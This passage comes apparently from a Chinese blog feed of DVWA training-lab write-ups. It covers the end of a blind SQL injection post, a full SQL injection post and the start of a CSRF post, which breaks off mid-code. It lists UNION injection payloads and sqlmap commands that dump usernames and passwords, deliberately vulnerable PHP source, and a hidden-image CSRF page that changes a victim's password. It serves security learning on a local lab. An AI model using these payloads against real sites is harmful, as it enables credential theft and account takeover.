class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>还是抓包，然后修改上传数据，大体同SQL Injection （Medium）</p><h1 id="High："><a href="#High：" class="headerlink" title="High："></a>High：</h1><p>查看源码： </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount</span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以看到当SQL语句查询为空的时候，会随机执行sleep()函数，并随机延迟2~4秒，那么用时间盲注就可能被影响，因此这关用布尔盲注。具体同Low级别一样。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;SQL盲注与一般SQL注入的区别在于一般SQL注入的攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面</summary>
      
    
    
    
    
    <category term="DVWA-labs" scheme="http://example.com/tags/DVWA-labs/"/>
    
  </entry>
  
  <entry>
    <title>DVWA—SQL Injection</title>
    <link href="http://example.com/2021/03/09/DVWA%E2%80%94SQL%20Injection/"/>
    <id>http://example.com/2021/03/09/DVWA%E2%80%94SQL%20Injection/</id>
    <published>2021-03-09T13:20:45.370Z</published>
    <updated>2021-03-12T11:38:26.286Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>之前有刷过sqlilabs，前言就不再介绍了。</p><h1 id="Low："><a href="#Low：" class="headerlink" title="Low："></a>Low：</h1><h2 id="手工注入："><a href="#手工注入：" class="headerlink" title="手工注入："></a>手工注入：</h2><p><strong>1）判断是否存在注入点，注入点是字符型还是数字型</strong></p><p>1’ and ‘1’=’1，成功</p><p>1’ and ‘1’=’2，返回结果为空，存在说明存在注入点且为<code>&#39;</code></p><p><strong>2）猜解SQL查询语句中的字段数</strong></p><p>1’ order by 1#不报错；</p><p>1’ order by 2#不报错；</p><p>1’ order by 3#报错，说明SQL查询语句中只有两个字段，即这里的First name、Surname。</p><p><strong>3）判断回显位</strong></p><p>0’ union select 1,2#![1](DVWA—SQL Injection/1.png)</p><p>有两个回显位。</p><p><strong>4）爆库</strong></p><p>0’ union select 1,database()#![2](DVWA—SQL Injection/2.png)</p><p><strong>5）爆表</strong></p><p>0’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#![3](DVWA—SQL Injection/3.png)</p><p><strong>6）爆列</strong></p><p>0’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#</p><p>![4](DVWA—SQL Injection/4.png)</p><p><strong>7）爆值</strong></p><p>0’ union select user,password from users#</p><p>![5](DVWA—SQL Injection/5.png)</p><p>或0’ union select 1,group_concat(user,0x3a,password) from users# </p><p>![6](DVWA—SQL Injection/6.png)</p><h2 id="利用sqlmap自动注入："><a href="#利用sqlmap自动注入：" class="headerlink" title="利用sqlmap自动注入："></a>利用sqlmap自动注入：</h2><p><strong>1）获取所有数据库</strong></p><p>sqlmap.py -u “url”   –cookie “cookie中的内容” –dbs</p><p>sp：　-u ： 指定url扫描,但url必须存在查询参数. 例: xxx.php?id=1 </p><p>​            –dbs：获取所有数据库</p><p><strong>2）查询当前数据库名</strong></p><p>sqlmap.py -u “url”   –cookie “cookie中的内容” –current-db</p><p>sp： –current-db：查询当前数据库昵称</p><p><strong>3）查表名</strong></p><p>sqlmap.py -u “url” –cookie=”cookie中的内容” –batch -D dvwa –tables</p><p>sp：-D：指定数据库</p><p>　　–table：查询所有表</p><p>​        –batch：批处理,也就是系统默认选项(按照默认的选项 全自动执行)</p><p><strong>4）查列名</strong></p><p>sqlmap.py -u “url” –cookie=”cookie中的内容” –batch -D dvwa -T users –columns</p><p>sp：-T：指定表名</p><p>​        –columns：查询所有列</p><p><strong>5）查值</strong></p><p>sqlmap.py -u “url” –cookie=”cookie中的内容” –batch -D dvwa -C user,password –dump</p><p>sp：-C：指定columns 如果不指定,默认整表</p><ul><li>查看源码：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;   </span><br><span class="line">     <span class="comment">// Get input  </span></span><br><span class="line">     $id = $_REQUEST[ <span class="string">&#x27;id&#x27;</span> ];  </span><br><span class="line">     </span><br><span class="line">     <span class="comment">// Check database  </span></span><br><span class="line">     $query = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;            $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );         <span class="comment">// Get results  </span></span><br><span class="line">      <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;     </span><br><span class="line">      <span class="comment">// Get values     </span></span><br><span class="line">      $first = $row[<span class="string">&quot;first_name&quot;</span>];     </span><br><span class="line">      $last = $row[<span class="string">&quot;last_name&quot;</span>];     </span><br><span class="line">      </span><br><span class="line">      <span class="comment">// Feedback for end user     </span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;   &#125;   </span><br><span class="line">      mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]); </span><br><span class="line">      &#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h1 id="Medium："><a href="#Medium：" class="headerlink" title="Medium："></a>Medium：</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123; </span><br><span class="line"></span><br><span class="line">  <span class="comment">//Get input*</span></span><br><span class="line">  $id = $_POST[ <span class="string">&#x27;id&#x27;</span> ]; </span><br><span class="line"></span><br><span class="line">  $id = mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">  $query = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>; </span><br><span class="line">  $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> ); </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="comment">//Get results </span></span><br><span class="line"><span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123; </span><br><span class="line">        <span class="comment">//Display values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">$query  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>我们可以看到服务器使用mysql_real_escape_string()函数过滤了一些字符（其中包括反斜杠，单双引号），同时网页端选择了下拉选择菜单限制我们输入。但是我们看到本关的注入点为数字型，那么我们可以利用抓包的方式修改上传数据。![7](DVWA—SQL Injection/7.png)</p><h1 id="High："><a href="#High：" class="headerlink" title="High："></a>High：</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_SESSION[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>我们注意到这关的数据提交页面和查询结果返回页面不是同一个页面</p><p>![8](DVWA—SQL Injection/8.png)</p><p>但是这关如果用手工注入的话，难度和Low级别是一样的，那么这关针对防御的是一般的sqlmap注入，因为sqlmap在注入过程中，无法在数据提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p><h1 id="Impossible："><a href="#Impossible：" class="headerlink" title="Impossible："></a>Impossible：</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/leezhxing/p/5282437.html">https://www.cnblogs.com/leezhxing/p/5282437.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;之前有刷过sqlilabs，前言就不再介绍了。&lt;/p&gt;
&lt;h1 id=&quot;Low：&quot;&gt;&lt;a href=&quot;#Low：&quot; class=&quot;h</summary>
      
    
    
    
    
    <category term="DVWA-labs" scheme="http://example.com/tags/DVWA-labs/"/>
    
  </entry>
  
  <entry>
    <title>DVWA—Cross Site Request Forgery (CSRF)</title>
    <link href="http://example.com/2021/03/04/DVWA%E2%80%94CSRF/"/>
    <id>http://example.com/2021/03/04/DVWA%E2%80%94CSRF/</id>
    <published>2021-03-04T10:16:08.000Z</published>
    <updated>2021-03-12T11:36:58.763Z</updated>
    
    <content type="html"><![CDATA[<p>前言：</p><p>CSRF，全称Cross-site request forgery，译为跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。需要注意的是，受害者需要使用含有效cookie的浏览器访问攻击者的页面时才会触发csrf攻击。</p><p><img src="/2021/03/04/DVWA%E2%80%94CSRF/1.png" alt="1"></p><h1 id="Low"><a href="#Low" class="headerlink" title="Low:"></a>Low:</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>我们可以看到服务器没有任何的防CSRF机制。那么我们可以构造404网页进行访问欺骗，编写test.html，内容为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost:81/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当受害者点击test.html时，就相当于攻击者利用受害者的cookie（即利用受害者的身份）进行了修改受害者账户密码这样一个操作。服务器那边会误以为是受害者自己下达的改密码的指令，而受害者会以为自己点到了一个失效的url，页面返回404,，但是其实这时受害者的密码已经被悄悄更改。可想而知CSRF的危害性多么大。</p><h1 id="Medium："><a href="#Medium：" class="headerlink" title="Medium："></a>Medium：</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( stripos( $_SERVER[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,$_SERVER[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">        $pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">            $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span 